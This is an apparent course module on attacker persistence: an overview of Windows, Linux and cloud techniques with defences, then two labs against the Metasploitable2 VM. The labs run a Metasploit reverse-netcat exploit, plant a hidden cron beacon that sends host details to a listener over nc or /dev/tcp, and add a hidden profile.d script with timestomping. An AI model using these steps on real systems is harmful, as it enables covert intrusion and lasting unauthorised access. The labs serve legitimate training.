### 1. What is persistence in cybersecurity?

Persistence refers to an adversary's ability to maintain long-term, covert access to a compromised environment. This capability allows attackers to sustain operations such as surveillance, credential theft, data exfiltration, or lateral movement across a network. Without persistence, every reboot or administrative intervention could sever their access, forcing them to repeat the costly and risky exploitation phase.

In practice, persistence is rarely implemented as a single mechanism. Sophisticated adversaries establish multiple redundant persistence channels. For example, they might create a scheduled task, implant a malicious DLL, and provision a new administrator account simultaneously. If defenders discover and remediate one method, the others still provide ongoing access.

The MITRE ATT&CK framework classifies persistence under several high-level techniques, including:

- Scheduled tasks or jobs that ensure that payloads run repeatedly
- Boot or logon autostart execution using startup folders or registry keys
- Account manipulation, where adversaries add new accounts or escalate privileges
- Valid accounts, where attackers hijack legitimate credentials for repeated logins

Persistence often overlaps with defense evasion. For example, attackers may disguise their backdoor to avoid alerting security software, modify file timestamps to hide installation, or rename processes to resemble trusted binaries. This blending of persistence and evasion is a hallmark of advanced operations.

### 2. Persistence on Windows systems

Windows environments, dominant in enterprise networks, provide a broad attack surface for persistence. Attackers leverage the operating system's built-in automation, service management, and registry configuration options. Common persistence techniques include:

- **Registry run keys:** By inserting references to malicious executables into keys such as HKCU\Software\Microsoft\Windows\CurrentVersion\Run, adversaries ensure that their payload executes each time a user logs in.
- **Scheduled tasks:** Using schtasks.exe, attackers configure scripts or binaries to run at regular intervals or specific events, such as system startup. These tasks often masquerade as legitimate maintenance jobs.
- **Windows services:** By creating or modifying services, attackers run malicious processes in the background. Renaming them to mimic legitimate services makes them harder to spot.
- **DLL search order hijacking:** Malicious DLLs placed in directories searched before the legitimate ones are loaded by trusted applications, granting covert persistence.
- **WMI event subscriptions:** Windows Management Instrumentation allows attackers to register scripts that execute when defined system events occur (e.g., logon, process creation).

**Case study:** The Equation Group, believed to be tied to the National Security Agency (NSA), was reported to have used WMI event subscriptions to maintain persistence even in highly restricted environments. In air-gapped networks, their implants remained dormant until connectivity was restored, at which point they reactivated and re-established communication.

### 3. Persistence on Linux systems

Linux persistence often exploits startup scripts, cron scheduling, and dynamic library loading. Given its prevalence in servers, containers, and cloud workloads, Linux persistence has become a key focus for attackers.

- **Cron jobs:** Attackers schedule malicious tasks with crontab -e or by adding files under /etc/cron.d/. These jobs frequently launch reverse shells or re-download payloads at intervals.
- **Startup scripts:** Modifications to .bashrc, .bash_profile, or /etc/profile.d/ execute attacker code whenever a user logs in.
- **Systemd services:** Malicious unit files in /etc/systemd/system/ ensure persistent background processes. Attackers often mimic legitimate daemons to evade attention.
- **LD_PRELOAD and shared libraries:** By abusing environment variables, such as LD_PRELOAD, attackers load malicious code into every process that uses shared libraries.

**Case study:** The Kinsing malware campaign (2022) targeted misconfigured Docker environments. Even after administrators removed the initial infection, hidden cron jobs re-downloaded the malware binaries. This cycle made reinfection almost inevitable until administrators eliminated all persistence mechanisms.

### 4. Persistence in cloud environments

As organizations migrate infrastructure and applications to the cloud, adversaries have adapted persistence techniques accordingly. Key cloud-based persistence strategies include:

- **Identity and Access Management (IAM) role abuse:** Attackers escalate privileges by creating new roles, modifying permissions, or attaching policies that guarantee long-term access.
- **OAuth token hijacking:** Compromised long-lived API tokens provide continuous access to SaaS applications, even without valid credentials.
- **Malicious serverless functions:** Attackers inject code into serverless platforms (e.g., AWS Lambda, Azure Functions) that automatically execute during scheduled or triggered events.
- **Storage bucket implants:** Malware stored in cloud-hosted buckets can auto-sync to user endpoints, re-establishing presence after cleanup.

**Case study:** In 2021, attackers exploiting misconfigured AWS IAM roles created multiple overlapping access keys. Even after defenders revoked some keys, the unused ones remained active, ensuring continued persistence. This demonstrated the importance of complete credential revocation and tight IAM monitoring.

### 5. Malware-driven persistence

Modern malware frequently includes persistence mechanisms by design. These ensure that the malware survives reboots, escalates privileges, and continues to operate despite defensive actions. Examples include:

- **Rootkits:** These modify the operating system kernel, making malicious components both persistent and invisible to user-level tools.
- **Bootkits:** By infecting the Master Boot Record (MBR) or UEFI firmware, bootkits execute before the operating system even loads, giving attackers deep persistence.
- **Ransomware:** Families such as Ryuk and Conti establish persistence through scheduled tasks and service installation, ensuring that encryption routines continue after restarts.

### 6. Hybrid tactics: Persistence and evasion

Persistence mechanisms are rarely deployed in isolation. Skilled adversaries combine persistence with anti-forensic techniques to evade detection and complicate investigation. For example:

- **Timestomping:** Altering file creation and modification times to appear older than they are
- **Log deletion:** Clearing or tampering with system logs to remove traces of installation
- **Masquerading:** Renaming executables or services to mimic trusted processes (e.g., svch0st.exe instead of svchost.exe)

Such hybrid tactics make it challenging for defenders to determine when and how an intrusion began. Forensic analysts must correlate multiple indicators across timelines to uncover these strategies.

### 7. Defensive detection and mitigation

Defending against persistence requires layered security measures and continuous monitoring:

- **File Integrity Monitoring (FIM):** Detects unauthorized modifications in critical system directories.
- **Behavioral monitoring:** Alerts when suspicious commands (e.g., schtasks, systemctl, crontab) are used abnormally.
- **Privilege management:** Restricts users from writing to startup paths or creating new services without authorization.
- **Endpoint Detection and Response (EDR):** Provides timeline-based visibility, enabling analysts to spot persistence attempts such as timestomping.
- **Cloud Security Posture Management (CSPM):** Identifies over-privileged IAM accounts and long-lived API tokens in cloud environments.

A defense-in-depth strategy ensures that even if attackers succeed in establishing persistence, defenders can still detect and neutralize their footholds.

-----

# Lab: Persistence Implementation on Metasploitable2: Cron-Based Beacon

**Estimated time needed:** 45 minutes

## Overview

After exploiting Metasploitable2 from your Kali VM and gaining a shell, the next step is establishing persistence. Attackers use persistence to survive reboots and maintain long-term control. One common method on Linux is cron jobs. In this lab, you will create a benign cron-based beacon on the **Metasploitable2 target machine** to simulate attacker persistence. The beacon will log activity locally and optionally send messages to a listener on your Kali VM.

Please note that the screenshots are for reference only, your results might differ depending on your own systems and network configuration.

> **Safety Note:** The beacon script is harmless — it only writes timestamped log entries and optionally sends a short text line to a listener. Do **not** create reverse shells or interactive backdoors in this lab.

## Learning objectives

After completing this lab, you will be able to:

- Transfer a script from Kali to Metasploitable2
- Create a cron-based beacon on the compromised host
- Validate persistence with logs and a listener
- Explain where defenders look for cron-based persistence

## Notes/assumptions

- Replace `<MSF2_IP>`, `<KALI_IP>`, and `<KALI_LISTEN_PORT>` with your actual addresses and port numbers.
- Use `/tmp` or `/var/tmp` for script/log storage to avoid permission problems on `/var/log`.
- This lab assumes you have an interactive shell on the target (e.g., via Meterpreter or a bind/reverse shell).
- Cron entries added with `crontab -e` run under the current user. If you need a system-wide cron, that requires root.

# Terminal Usage Guide

This lab uses three separate terminal windows. To reduce confusion, each terminal has a specific purpose:

Terminal A – Victim Terminal (Metasploitable2)

- Use this terminal for commands executed on the target VM (Metasploitable2). Examples: run `whoami`, create the beacon script (`/tmp/.update.sh`), set up the crontab (`crontab -e`), and inspect `/tmp/poc_logs`. Do **not** run the Kali exploit listener here.

Terminal B – Exploit / Metasploit Terminal (Kali)

- Use this terminal to run `msfconsole` and launch the exploit that obtains the initial shell on the target. Capture/manage sessions here. After exploitation, use Terminal A for actions that must be performed directly on the target shell.

Terminal C – Listener / Validation Terminal (Kali)

- Use this terminal to run the optional netcat listener that receives beacon callbacks:

1. `nc -lvnp 5555`
    

Use Terminal C only to verify remote callbacks; do not perform target configuration here.

Terminal D – File Transfer & Editor Terminal (Kali)

- Use this terminal to create/edit the beacon script locally on Kali, then transfer it to the target (scp/rsync) or connect via SSH to the target if needed for edits. Troubleshoot transfers here (check file contents prior to exec on target).

## Exercise 0: Confirm you are on the target

***On Kali (Terminal B)**, run the exploit to obtain a shell on Metasploitable2 (example; use the module/path that worked for you):

1. `msfconsole -q`
2. `use exploit/multi/samba/usermap_script`
3. `set RHOSTS <MSF2_IP>`
4. `set RPORT 139`
5. `set PAYLOAD cmd/unix/reverse_netcat`
6. `set LHOST <KALI_IP>`
7. `set LPORT 5553`
8. `run`

![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/ShhXNbSmJs9CMF9gh5UU6Q/2.png)

On the target shell, verify your identity:

1. `whoami`
2. `id`
3. `pwd`
### Why this step is important:

Persistence must be created on the compromised host. Confirm you are operating on Metasploitable2 and under the intended user account.
## Exercise 1: Prepare a listener on Kali

Open **Terminal C** on Kali and start a netcat listener for optional beacon callbacks:

1. `nc -lvnp 5555`
Expected output:

2. `listening on [any] <KALI_LISTEN_PORT> ...`
### Why this step is important:

The listener will optionally receive beacon messages, and let you verify remote callbacks without creating shells.

## Exercise 2: Create the beacon script on Metasploitable2

**Preferred path — create and edit on the victim:** Use **Terminal A** (the Metasploitable2 shell/session) to create `/tmp/.update.sh` with safe, absolute paths.

If you prefer to prepare the file on Kali and transfer, use **Terminal D** to create/edit the file locally and then `scp` or `rsync` it to the target.

On the target (Terminal A), create the script:

1. `cat << 'EOF' > /tmp/.update.sh`
2. `#!/usr/bin/env bash`
3. `# Benign cron beacon: logs a timestamp and optionally notifies a remote listener`
4. `#`
5. `# NOTE: replace <KALI_IP> and <KALI_PORT> below (no angle brackets).`
6. `PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"`
7. `LOG_DIR="/tmp/poc_logs"`
8. `LOG_FILE="$LOG_DIR/persist.log"`
9. `LISTENER_HOST="<KALI_IP>"`
10. `LISTENER_PORT="<KALI_PORT>"`

11. `# Ensure basics`
12. `mkdir -p "$LOG_DIR"`
13. `touch "$LOG_FILE"`
14. `chmod 600 "$LOG_FILE"`

15. `# meta`
16. `TS="$(/bin/date +%F_%T 2>/dev/null || date +%F_%T)"`
17. `USER_NAME="$(/usr/bin/whoami 2>/dev/null || echo unknown)"`
18. `HOST_NAME="$(/bin/hostname 2>/dev/null || echo host)"`
19. `PID="$$"`
20. `BEACON="[BEACON] ts=$TS user=$USER_NAME host=$HOST_NAME pid=$PID src=/tmp/.update.sh"`

21. `# keep log size modest (rotate simple: keep last 200 lines)`
22. `if [ -f "$LOG_FILE" ]; then`
23.   `/usr/bin/tail -n 200 "$LOG_FILE" > "${LOG_FILE}.tmp" 2>/dev/null || true`
24.   `/bin/mv -f "${LOG_FILE}.tmp" "$LOG_FILE" 2>/dev/null || true`
25. `fi`

26. `# append beacon to local log`
27. `echo "$BEACON" >> "$LOG_FILE"`

28. `# small function to attempt a short TCP send (non-blocking, silent)`
29. `_send_beacon_once() {`
30.   `local host="$1" port="$2" msg="$3"`
31.   `# prefer nc if available`
32.   `if command -v /bin/nc >/dev/null 2>&1 || command -v /usr/bin/nc >/dev/null 2>&1; then`
33.     `NC="$(command -v /bin/nc 2>/dev/null || command -v /usr/bin/nc 2>/dev/null || command -v nc 2>/dev/null)"`
34.     `"$NC" -w 3 "$host" "$port" <<<"$msg" >> "$LOG_FILE" 2>&1 && return 0 || return 1`
35.   `fi`
36.   `# fallback to bash /dev/tcp`
37.   `if bash -c "exec 3<>/dev/tcp/${host}/${port}" >/dev/null 2>&1; then`
38.     `printf '%s\n' "$msg" >&3 2>/dev/null || true`
39.     `exec 3>&- || true`
40.     `return 0`
41.   `fi`
42.   `return 1`
43. `}`

44. `# If listener configured, try a few quick attempts (do not block indefinitely)`
45. `if [ -n "$LISTENER_HOST" ] && [ -n "$LISTENER_PORT" ]; then`
46.   `tries=3`
47.   `attempt=1`
48.   `while [ $attempt -le $tries ]; do`
49.     `echo "[CONNECT_ATTEMPT] attempt=$attempt ts=$(/bin/date +%F_%T) host=${LISTENER_HOST} port=${LISTENER_PORT}" >> "$LOG_FILE"`
50.     `if _send_beacon_once "$LISTENER_HOST" "$LISTENER_PORT" "$BEACON"; then`
51.       `echo "[CONNECT_OK] ts=$(/bin/date +%F_%T) host=${LISTENER_HOST} port=${LISTENER_PORT}" >> "$LOG_FILE"`
52.       `break`
53.     `else`
54.       `echo "[CONNECT_FAIL] attempt=$attempt ts=$(/bin/date +%F_%T)" >> "$LOG_FILE"`
55.     `fi`
56.     `sleep $((2 * attempt))   # small backoff`
57.     `attempt=$((attempt + 1))`
58.   `done`

59.   `if [ $attempt -gt $tries ]; then`
60.     `echo "[CONNECT_GIVEUP] ts=$(/bin/date +%F_%T) tries=${tries}" >> "$LOG_FILE"`
61.   `fi`
62. `else`
63.   `echo "[NO_LISTENER_CFG] ts=$(/bin/date +%F_%T) skip remote send" >> "$LOG_FILE"`
64. `fi`

65. `exit 0`
66. `EOF`

Then (on Terminal A) update listener details, make executable and verify:

2. `sudo sed -i 's/<KALI_IP>/YOUR.KALI.IP.HERE/' /tmp/.update.sh`
3. `sudo sed -i 's/<KALI_PORT>/5555/' /tmp/.update.sh`
4. `sudo chmod +x /tmp/.update.sh`
5. `ls -l /tmp/.update.sh`
6. `head -n 20 /tmp/.update.sh`

If you created the file on Kali (Terminal D) and transferred it, ssh to the target (Terminal D -> then interact on Terminal A) if you need to run it interactively there:

1. `ssh -oHostKeyAlgorithms=+ssh-rsa \`
2.     `-oPubkeyAcceptedAlgorithms=+ssh-rsa \`
3.     `-oPubkeyAcceptedKeyTypes=+ssh-rsa \`
4.     `msfadmin@<MSF2_IP>`

- password is msfadmin

### Why this step is important:

This script is intentionally nondestructive and safe — it logs locally and attempts a short TCP write to a listener (no shell spawned).
## Exercise 3: Schedule the cron job on Metasploitable2

**On Terminal A (Victim Terminal)** edit the crontab for the user:

1. `export TERM=xterm`
2. `sudo crontab -e`

Add the following line (runs every 5 minutes):

1. `*/5 * * * * /tmp/.update.sh >/dev/null 2>&1`
Save and exit. Confirm the crontab:

2. `crontab -l`
**Quick test:** Run the script manually to confirm behavior before waiting for cron:

3. `/tmp/.update.sh`
4. `tail -n 10 /tmp/poc_logs/persist.log`
### Why this step is important:

Testing ensures the script works and that cron will execute it when scheduled.
## Exercise 4: Validate the beacon

1. Wait up to 5–6 minutes, then check the log on **Terminal A**:

2. `tail -n 20 /tmp/poc_logs/persist.log`

Expected output (example):

1. `[BEACON] ts=2025-08-29_10:35:00 user=msfadmin host=metasploitable pid=12345 src=/tmp/.update.sh`

2. Check **Terminal C** (Kali listener). If listener was running and network path is allowed, it should display short lines with the BEACON text.
    
3. If you see nothing on Kali, check:
    
- Target can reach Kali (from target: `ping -c2 <KALI_IP>` on Terminal A)
- Firewall / host-only NAT settings
- Listener port correctness

### Why this step is important:

Confirming both local logs and optional remote callbacks gives defenders relevant telemetry to detect.

## Exercise 5: Cleanup (recommended for shared environments)

**On Terminal A:**

1. `# remove the specific line from crontab`
2. `crontab -l | sed '/\/tmp\/\.update\.sh/d' | crontab -`
3. `# remove files`
4. `rm -f /tmp/.update.sh`
5. `rm -rf /tmp/poc_logs`
### Why this step is important:

Cleaning up avoids cross-lab contamination and restores the VM for future students.

## Troubleshooting and notes

- If cron does not run, check `ps aux | grep cron` on the target — some minimal images may not have cron running; on such images you can use `sleep`+loop for testing but document the reason.
- If the TCP write to Kali fails, it's because either the target cannot reach Kali or `/dev/tcp` is not supported; in that case rely on the local log file as evidence.
- Use absolute paths and avoid `/var/log` in the lab unless you intend to use privileged writes.
- The script intentionally does not create a reverse shell or persistent backdoor; keep it benign.

------------------
# Lab2: Multi-Vector Persistence and Evasion

**Estimated time needed:** 30 minutes

## Overview

Adversaries often use redundant persistence mechanisms combined with anti-forensic techniques to remain hidden. In real environments, they may plant startup scripts, manipulate file timestamps (timestomping), or scatter decoys to mislead defenders. This lab simulates those tactics, giving you the opportunity to create multiple persistence vectors and apply timestomping to evade detection. Defenders who understand these techniques are better prepared to hunt for subtle signs of long-term compromise.

In this lab, you will simulate how adversaries establish redundant persistence vectors and attempt to hide their tracks through anti-forensic techniques such as timestomping. Instead of backdoors or shells, you will safely deploy benign artifacts that mimic attacker tradecraft while writing only to local logs.

> **Safety Note:** This lab is strictly educational. No reverse shells or network callbacks are used. All actions remain on the host and produce auditable local artifacts.

## Learning objectives

After completing this lab, you will be able to:

- Implement multiple persistence vectors on a Linux system
- Apply timestomping to simulate anti-forensic evasion
- Validate persistence activity through log entries after reboot/login
- Investigate suspicious files with detection commands
## Exercise 0: Pre-lab setup

1. Ensure you already have a **primary persistence vector** from the previous lab (cron job). If not, create one on the metasploitable2 vm/image quickly:

Replace <MSF_IP> with the Metasploitable2 VM IP (e.g. 192.168.1.49) password: msfadmin

1. ` ```bash `
2. `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@<MSF_IP>`

3. `(crontab -l 2>/dev/null; echo '@reboot echo "$(date +%F_%T) [CRON_TRIGGER] user=$(whoami)" >> /var/log/poc/cron-persist.log') | crontab -`
4. ` ``` `

![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/UF8FFCBWjlMTw_1XuIibTw/1.png)

2. Confirm the log directory exists:
    
    1. `sudo mkdir -p /var/log/poc`
    2. `sudo touch /var/log/poc/persist.log`
    3. `sudo chmod 644 /var/log/poc/persist.log`

### Why this step is important:

Having two persistence mechanisms (cron and profile.d) simulates redundancy. Logs provide the artifacts you will use to validate activity.

## Troubleshooting Exercise — SSH refused: quick troubleshooting

Context: If your `ssh` attempt to the Metasploitable2 target returns _Connection refused_, follow these steps to diagnose and fix the problem. Replace `<container>` and `<container_ip>` with the container name (example `metasploitable2`) and IP (example `172.18.0.2`) shown by `docker inspect`.

Step 1 - Confirm container status & IP

```
1. `# list running containers and names`
2. `sudo docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"`

3. `# get the container IP (replace <container>)`
4. `sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container>`
```
Step 2 - Check container logs for sshd errors

1. `sudo docker logs <container> --tail 200`
Step 3 - Exec into the container and check sshd

1. `# open an interactive shell (replace <container>)`
2. `sudo docker exec -it <container> /bin/bash`

3. `# inside the container, check sshd`
4. `ps aux | grep -E 'sshd|ssh'`
5. `ss -tlnp | grep :22 || netstat -tlnp | grep :22`

6. `# if sshd is stopped, try starting it`
7. `service ssh start || /etc/init.d/ssh start || /usr/sbin/sshd -D &`

Step 4 - Confirm host-side port mappings (if you expect to connect via host)

1. `# show port mappings for <container>`
2. `sudo docker port <container>`

3. `# view full port JSON if needed`
4. `sudo docker inspect -f '{{json .NetworkSettings.Ports}}' <container> | jq .`
Step 5 - Re-scan from Kali and test

5. `# from Kali host`
6. `sudo nmap -Pn -sV -p22 <container_ip>`
7. `nc -v -z <container_ip> 22`
8. `# or test via host mapping if container exposes host port 2222:`
9. `ssh -p 2222 msfadmin@localhost`

Step 6 - If SSH remains refused

- Restart the container: `sudo docker restart <container>` then repeat Steps 2–5.
- If the container does not expose port 22 on the host and you prefer host access, recreate with port mapping:  
    `sudo docker run -d --name metasploitable2 -p 2222:22 <metasploitable-image>` and then `ssh -p 2222 msfadmin@localhost`.
- If you cannot `exec` into the container, check host firewall/iptables: `sudo iptables -L -n` or `sudo nft list ruleset`.

**Do not repeatedly hammer the SSH port. If attempts fail more than 5 times, collect container logs and notify the instructor with the logs and the output of `docker inspect` for troubleshooting.**

Example (for this lab): if your container name is `metasploitable2` and IP is `172.18.0.2`, run the commands above replacing `<container>` with `metasploitable2` and `<container_ip>` with `172.18.0.2`.
## —a

## Exercise 1: Create a secondary persistence vector

1. Place a benign script in `/etc/profile.d/` that triggers on interactive shell login:
    
    1. `sudo bash -c 'cat > /etc/profile.d/.env.sh << "EOF"`
    2. `#!/usr/bin/env bash`
    3. `SESSION_ID="$(hostname)-$(id -u)-$(stat -c %Y /etc/profile.d/.env.sh 2>/dev/null || echo 0)"`
    4. `echo "$(date +%F_%T) [PROFILE_D_TRIGGER] user=$(whoami) tty=${TTY:-none} session=${SESSION_ID}" >> /var/log/poc/persist.log`
    5. `EOF'`
 
2. Verify contents and permissions:
    
    1. `sudo head -n 5 /etc/profile.d/.env.sh`
    2. `ls -l /etc/profile.d/.env.sh`
  
### Why this step is important:

Startup locations such as `/etc/profile.d/` are common persistence targets. Here you simulate that behavior with harmless logging.
## Exercise 2: Make the script executable

1. Ensure the script can run:
    
    1. `sudo chmod +x /etc/profile.d/.env.sh`
    2. `ls -l /etc/profile.d/.env.sh`
### Why this step is important:

Scripts in `/etc/profile.d/` only perform if they are marked as executable. Attackers ensure this to guarantee their persistence survives.
## Exercise 3: Apply timestomping

1. Backdate the script to simulate anti-forensics (for example, 1 Jan 2022):
    
    1. `sudo touch -t 202201010101 /etc/profile.d/.env.sh`
    
2. Create a decoy artifact in `/tmp` and timestomp it as well:
    
    1. `sudo bash -c 'echo "# harmless decoy updater" > /tmp/.update.sh'`
    2. `sudo chmod +x /tmp/.update.sh`
    3. `sudo touch -t 202201010101 /tmp/.update.sh`
3. Verify the timestamps:
    
    1. `stat /etc/profile.d/.env.sh`
    2. `stat /tmp/.update.sh`
    3. `ls -l --time-style=full-iso /etc/profile.d/.env.sh /tmp/.update.sh`

### Why this step is important:

Timestomping hides malicious files by making them appear older. As defenders, you must corroborate with hashes and logs.
## Exercise 4: Validate persistence after reboot

1. Reboot the system:
    
    1. `sudo reboot`
    
    2. `#wait a minute and log in again`
    3. `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa [msfadmin@192.168.1](mailto:msfadmin@192.168.1).49`
2. After logging back in, trigger the profile.d script by starting a login shell:
    
    1. `bash -l`
3. Validate the log entries:
    
    1. `tail -n 10 /var/log/poc/persist.log`
    2. `tail -n 10 /var/log/poc/cron-persist.log`
### Why this step is important:

Redundant persistence ensures that at least one vector survives defensive cleanup. Validation confirms both paths executed successfully.

## Exercise 5: Evasion and detection

1. Detect suspicious executables in `/etc/profile.d`:
    
    1. `sudo find /etc/profile.d -type f -perm -111 -printf '%TY-%Tm-%Td %TH:%TM %p\n'`

2. Collect metadata and hashes:
    
    1. `stat /etc/profile.d/.env.sh`
    2. `sha256sum /etc/profile.d/.env.sh`

3. Check package ownership (not normally present):
    
    1. `dpkg -S /etc/profile.d/.env.sh || echo "Not owned by any package"`
### Why this step is important:

Attackers attempt to blend in with legitimate files. Defenders use hashing, package checks, and behavioral indicators to detect anomalies.
## Exercise 6: Cleanup (optional)

1. Remove persistence artifacts and logs if cleanup is required:
    
    1. `sudo rm -f /etc/profile.d/.env.sh /tmp/.update.sh`
    2. `sudo rm -f /var/log/poc/persist.log /var/log/poc/cron-persist.log`
    3. `sudo rmdir /var/log/poc 2>/dev/null || true`
    4. `crontab -r`
### Why this step is important:

Cleanup resets the VM to a known-good state, preventing lab artifacts from interfering with later exercises.